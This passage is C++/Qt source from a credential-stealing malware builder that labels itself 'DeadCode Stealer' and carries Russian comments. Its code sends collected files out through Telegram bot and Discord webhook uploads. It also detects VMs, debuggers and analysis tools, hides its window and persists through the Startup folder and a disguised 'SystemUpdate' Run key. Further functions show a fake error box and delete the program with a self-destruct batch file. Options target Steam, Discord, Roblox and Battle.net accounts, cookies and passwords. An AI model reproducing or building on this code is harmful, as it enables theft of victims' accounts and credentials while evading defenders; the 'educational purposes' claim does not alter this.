    inFile.seekg(0, std::ios::end);
    size_t size = inFile.tellg() - iv.size();
    inFile.seekg(iv.size(), std::ios::beg);
    QByteArray encryptedData(size, 0);
    inFile.read(encryptedData.data(), size);
    inFile.close();

    auto key = GetEncryptionKey(true);

    // Дешифрование AES
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES: " + QString::number(status, 16));
        outFile.close();
        return;
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        outFile.close();
        return;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        outFile.close();
        return;
    }

    DWORD bytesDecrypted = 0;
    DWORD resultSize = encryptedData.size();
    std::vector<UCHAR> decryptedData(resultSize);

    status = BCryptDecrypt(hKey, (PUCHAR)encryptedData.data(), encryptedData.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
                           decryptedData.data(), resultSize, &bytesDecrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка дешифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        outFile.close();
        return;
    }

    QByteArray decrypted = QByteArray((char*)decryptedData.data(), bytesDecrypted);

    // Дешифрование XOR
    decrypted = applyXOR(decrypted, key);

    // Запись расшифрованных данных
    outFile.write(decrypted.data(), decrypted.size());
    outFile.close();

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    emitLog("Данные успешно расшифрованы: " + QString::fromStdString(outputPath));
}

// Отправка данных
void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
    emitLog("Отправка данных...");

    if (config.sendMethod == "Local File") {
        for (const auto& file : files) {
            saveToLocalFile(file);
        }
    } else if (config.sendMethod == "Telegram") {
        for (const auto& file : files) {
            sendToTelegram(file);
        }
    } else if (config.sendMethod == "Discord") {
        for (const auto& file : files) {
            sendToDiscord(file);
        }
    } else {
        emitLog("Ошибка: Неизвестный метод отправки: " + QString::fromStdString(config.sendMethod));
    }

    emitLog("Отправка данных завершена");
}

// Отправка в Telegram
void MainWindow::sendToTelegram(const std::string& filePath) {
    if (config.telegramToken.empty() || config.chatId.empty()) {
        emitLog("Ошибка: Telegram Token или Chat ID не указаны");
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL");
        return;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_name(part, "document");
    curl_mime_filedata(part, filePath.c_str());
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "chat_id");
    curl_mime_data(part, config.chatId.c_str(), CURL_ZERO_TERMINATED);

    std::string url = "https://api.telegram.org/bot" + config.telegramToken + "/sendDocument";
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки в Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        emitLog("Файл отправлен в Telegram: " + QString::fromStdString(filePath));
    }

    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}

// Отправка в Discord
void MainWindow::sendToDiscord(const std::string& filePath) {
    if (config.discordWebhook.empty()) {
        emitLog("Ошибка: Discord Webhook не указан");
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL");
        return;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, filePath.c_str());

    curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки в Discord: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        emitLog("Файл отправлен в Discord: " + QString::fromStdString(filePath));
    }

    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}

// Сохранение в локальный файл
void MainWindow::saveToLocalFile(const std::string& filePath) {
    QString outputDir = QDir::currentPath() + "/output";
    QDir().mkpath(outputDir);
    try {
        std::filesystem::copy_file(filePath, outputDir.toStdString() + "/" + std::filesystem::path(filePath).filename().string(),
                                   std::filesystem::copy_options::overwrite_existing);
        emitLog("Файл сохранен локально: " + outputDir + "/" + QString::fromStdString(std::filesystem::path(filePath).filename().string()));
    } catch (const std::exception& e) {
        emitLog("Ошибка сохранения файла локально: " + QString::fromStdString(e.what()));
    }
}

// Антианализ
bool MainWindow::AntiAnalysis() {
    if (!config.antiVM) return false;

    emitLog("Запуск антианализа...");

    // Проверка на виртуальную машину
    if (isRunningInVM()) {
        emitLog("Обнаружена виртуальная машина");
        return true;
    }

    // Проверка на отладчик
    if (IsDebuggerPresent()) {
        emitLog("Обнаружен отладчик");
        return true;
    }

    // Проверка на процессы анализа
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        emitLog("Ошибка: Не удалось создать снимок процессов");
        return false;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    std::vector<std::string> suspiciousProcesses = {
        "wireshark.exe", "fiddler.exe", "procmon.exe", "procexp.exe", "ollydbg.exe", "idaq.exe", "x64dbg.exe"
    };

    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::string processName = pe32.szExeFile;
            std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
            for (const auto& suspicious : suspiciousProcesses) {
                if (processName.find(suspicious) != std::string::npos) {
                    emitLog("Обнаружен подозрительный процесс: " + QString::fromStdString(processName));
                    CloseHandle(hSnapshot);
                    return true;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);

    // Проверка на песочницу
    DWORD tickCount = GetTickCount();
    Sleep(1000);
    if (GetTickCount() - tickCount < 900) {
        emitLog("Обнаружена песочница (время сна искажено)");
        return true;
    }

    emitLog("Антианализ пройден успешно");
    return false;
}

// Скрытие приложения
void MainWindow::Stealth() {
    emitLog("Запуск режима скрытности...");

    // Скрытие консольного окна
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
        emitLog("Консольное окно скрыто");
    } else {
        emitLog("Консольное окно не найдено (возможно, приложение запущено как GUI)");
    }

    // Минимизация окна приложения
    if (config.silent) {
        this->showMinimized();
        emitLog("Окно приложения минимизировано");
    }
}

// Установка персистентности
void MainWindow::Persist() {
    emitLog("Установка персистентности...");

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string exeName = std::filesystem::path(exePath).filename().string();

    std::string destPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + exeName;
    try {
        std::filesystem::copy_file(exePath, destPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Файл скопирован в автозагрузку: " + QString::fromStdString(destPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования в автозагрузку: " + QString::fromStdString(e.what()));
    }

    if (config.persist) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1) == ERROR_SUCCESS) {
                emitLog("Добавлена запись в реестр для автозапуска");
            } else {
                emitLog("Ошибка добавления записи в реестр");
            }
            RegCloseKey(hKey);
        } else {
            emitLog("Ошибка открытия ключа реестра для автозапуска");
        }
    }

    emitLog("Установка персистентности завершена");
}

// Отображение фейковой ошибки
void MainWindow::FakeError() {
    emitLog("Отображение фейковой ошибки...");

    MessageBoxA(NULL, "Critical Error: Application has encountered an unexpected error and will now close.",
                "Error", MB_ICONERROR | MB_OK);
    emitLog("Фейковая ошибка отображена");
}

// Самоуничтожение
void MainWindow::SelfDestruct() {
    emitLog("Запуск самоуничтожения...");

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string batchFile = std::string(getenv("TEMP")) + "\\self_destruct.bat";
    std::ofstream bat(batchFile);
    if (bat.is_open()) {
        bat << "@echo off\n";
        bat << "timeout /t 1 /nobreak >nul\n";
        bat << "del \"" << exePath << "\"\n";
        bat << "del \"%~f0\"\n";
        bat.close();

        ShellExecuteA(NULL, "open", batchFile.c_str(), NULL, NULL, SW_HIDE);
        emitLog("Самоуничтожение инициировано");
    } else {
        emitLog("Ошибка: Не удалось создать файл для самоуничтожения");
    }

    exitApp();
}

// Сохранение конфигурации
void MainWindow::saveConfig(const QString& fileName) {
    updateConfigFromUI();
    QString saveFileName = fileName;
    if (saveFileName.isEmpty()) {
        saveFileName = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.ini)");
        if (saveFileName.isEmpty()) return;
    }

    QSettings settings(saveFileName, QSettings::IniFormat);
    settings.setValue("sendMethod", QString::fromStdString(config.sendMethod));
    settings.setValue("buildMethod", QString::fromStdString(config.buildMethod));
    settings.setValue("telegramToken", QString::fromStdString(config.telegramToken));
    settings.setValue("chatId", QString::fromStdString(config.chatId));
    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
    settings.setValue("filename", QString::fromStdString(config.filename));
    settings.setValue("encryptionKey1", QString::fromStdString(config.encryptionKey1));
    settings.setValue("encryptionKey2", QString::fromStdString(config.encryptionKey2));
    settings.setValue("encryptionSalt", QString::fromStdString(config.encryptionSalt));
    settings.setValue("iconPath", QString::fromStdString(config.iconPath));
    settings.setValue("githubToken", QString::fromStdString(config.githubToken));
    settings.setValue("githubRepo", QString::fromStdString(config.githubRepo));
    settings.setValue("discord", config.discord);
    settings.setValue("steam", config.steam);
    settings.setValue("steamMAFile", config.steamMAFile);
    settings.setValue("epic", config.epic);
    settings.setValue("roblox", config.roblox);
    settings.setValue("battlenet", config.battlenet);
    settings.setValue("minecraft", config.minecraft);
    settings.setValue("cookies", config.cookies);
    settings.setValue("passwords", config.passwords);
    settings.setValue("screenshot", config.screenshot);
    settings.setValue("fileGrabber", config.fileGrabber);
    settings.setValue("systemInfo", config.systemInfo);
    settings.setValue("socialEngineering", config.socialEngineering);
    settings.setValue("chatHistory", config.chatHistory);
    settings.setValue("telegram", config.telegram);
    settings.setValue("antiVM", config.antiVM);
    settings.setValue("fakeError", config.fakeError);
    settings.setValue("silent", config.silent);
    settings.setValue("autoStart", config.autoStart);
    settings.setValue("persist", config.persist);
    settings.setValue("selfDestruct", config.selfDestruct);

    emitLog("Конфигурация сохранена: " + saveFileName);
}

// Загрузка конфигурации
void MainWindow::loadConfig() {
    QString fileName = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.ini)");
    if (fileName.isEmpty()) return;

    QSettings settings(fileName, QSettings::IniFormat);
    config.sendMethod = settings.value("sendMethod", "Local File").toString().toStdString();
    config.buildMethod = settings.value("buildMethod", "Local Build").toString().toStdString();
    config.telegramToken = settings.value("telegramToken", "").toString().toStdString();
    config.chatId = settings.value("chatId", "").toString().toStdString();
    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
    config.filename = settings.value("filename", "DeadCode.exe").toString().toStdString();
    config.encryptionKey1 = settings.value("encryptionKey1", "").toString().toStdString();
    config.encryptionKey2 = settings.value("encryptionKey2", "").toString().toStdString();
    config.encryptionSalt = settings.value("encryptionSalt", "").toString().toStdString();
    config.iconPath = settings.value("iconPath", "").toString().toStdString();
    config.githubToken = settings.value("githubToken", "").toString().toStdString();
    config.githubRepo = settings.value("githubRepo", "").toString().toStdString();
    config.discord = settings.value("discord", false).toBool();
    config.steam = settings.value("steam", false).toBool();
    config.steamMAFile = settings.value("steamMAFile", false).toBool();
    config.epic = settings.value("epic", false).toBool();
    config.roblox = settings.value("roblox", false).toBool();
    config.battlenet = settings.value("battlenet", false).toBool();
    config.minecraft = settings.value("minecraft", false).toBool();
    config.cookies = settings.value("cookies", false).toBool();
    config.passwords = settings.value("passwords", false).toBool();
    config.screenshot = settings.value("screenshot", false).toBool();
    config.fileGrabber = settings.value("fileGrabber", false).toBool();
    config.systemInfo = settings.value("systemInfo", false).toBool();
    config.socialEngineering = settings.value("socialEngineering", false).toBool();
    config.chatHistory = settings.value("chatHistory", false).toBool();
    config.telegram = settings.value("telegram", false).toBool();
    config.antiVM = settings.value("antiVM", false).toBool();
    config.fakeError = settings.value("fakeError", false).toBool();
    config.silent = settings.value("silent", false).toBool();
    config.autoStart = settings.value("autoStart", false).toBool();
    config.persist = settings.value("persist", false).toBool();
    config.selfDestruct = settings.value("selfDestruct", false).toBool();

    // Обновление UI
    sendMethodComboBox->setCurrentText(QString::fromStdString(config.sendMethod));
    buildMethodComboBox->setCurrentText(QString::fromStdString(config.buildMethod));
    tokenLineEdit->setText(QString::fromStdString(config.telegramToken));
    chatIdLineEdit->setText(QString::fromStdString(config.chatId));
    discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
    fileNameLineEdit->setText(QString::fromStdString(config.filename));
    encryptionKey1LineEdit->setText(QString::fromStdString(config.encryptionKey1));
    encryptionKey2LineEdit->setText(QString::fromStdString(config.encryptionKey2));
    encryptionSaltLineEdit->setText(QString::fromStdString(config.encryptionSalt));
    iconPathLineEdit->setText(QString::fromStdString(config.iconPath));
    githubTokenLineEdit->setText(QString::fromStdString(config.githubToken));
    githubRepoLineEdit->setText(QString::fromStdString(config.githubRepo));
    discordCheckBox->setChecked(config.discord);
    steamCheckBox->setChecked(config.steam);
    steamMAFileCheckBox->setChecked(config.steamMAFile);
    epicCheckBox->setChecked(config.epic);
    robloxCheckBox->setChecked(config.roblox);
    battlenetCheckBox->setChecked(config.battlenet);
    minecraftCheckBox->setChecked(config.minecraft);
    cookiesCheckBox->setChecked(config.cookies);
    passwordsCheckBox->setChecked(config.passwords);
    screenshotCheckBox->setChecked(config.screenshot);
    fileGrabberCheckBox->setChecked(config.fileGrabber);
    systemInfoCheckBox->setChecked(config.systemInfo);
    socialEngineeringCheckBox->setChecked(config.socialEngineering);
    chatHistoryCheckBox->setChecked(config.chatHistory);
    telegramCheckBox->setChecked(config.telegram);
    antiVMCheckBox->setChecked(config.antiVM);
    fakeErrorCheckBox->setChecked(config.fakeError);
    silentCheckBox->setChecked(config.silent);
    autoStartCheckBox->setChecked(config.autoStart);
    persistCheckBox->setChecked(config.persist);

    emitLog("Конфигурация загружена: " + fileName);
}

// Экспорт логов
void MainWindow::exportLogs() {
    QString fileName = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
    if (fileName.isEmpty()) return;

    QFile file(fileName);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << ui->textEdit->toPlainText();
        file.close();
        emitLog("Логи экспортированы: " + fileName);
    } else {
        emitLog("Ошибка: Не удалось экспортировать логи");
    }
}

// Выход из приложения
void MainWindow::exitApp() {
    emitLog("Завершение работы приложения...");
    QApplication::quit();
}

// Отображение информации о программе
void MainWindow::showAbout() {
    QMessageBox::about(this, "О программе", "DeadCode Stealer\nВерсия 1.0\nСоздано для образовательных целей.");
}

// Обработчики событий UI
void MainWindow::on_buildButton_clicked() {
    if (isBuilding) {
        QMessageBox::warning(this, "Предупреждение", "Сборка уже выполняется!");
        return;
    }

    updateConfigFromUI();
    if (config.filename.empty()) {
        QMessageBox::warning(this, "Ошибка", "Имя файла не указано!");
        return;
    }

    generateBuildKeyHeader();
    generatePolymorphicCode();
    copyIconToBuild();

    if (buildMethodComboBox->currentText() == "Local Build") {
        buildTimer->start(100);
    } else if (buildMethodComboBox->currentText() == "GitHub Actions") {
        triggerGitHubActions();
    }
}

void MainWindow::on_iconBrowseButton_clicked() {
    QString fileName = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
    if (!fileName.isEmpty()) {
        ui->iconPathLineEdit->setText(fileName);
        emitLog("Выбрана иконка: " + fileName);
    }
}

void MainWindow::on_actionSaveConfig_triggered() {
    saveConfig();
}

void MainWindow::on_actionLoadConfig_triggered() {
    loadConfig();
}

void MainWindow::on_actionExportLogs_triggered() {
    exportLogs();
}

void MainWindow::on_actionExit_triggered() {
    exitApp();
}

void MainWindow::on_actionAbout_triggered() {
    showAbout();
}

void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() == QNetworkReply::NoError) {
        emitLog("Сетевой запрос выполнен успешно");
    } else {
        emitLog("Ошибка сетевого запроса: " + reply->errorString());
    }
    reply->deleteLater();
}

void MainWindow::appendLog(const QString& message) {
    ui->textEdit->append(message);
}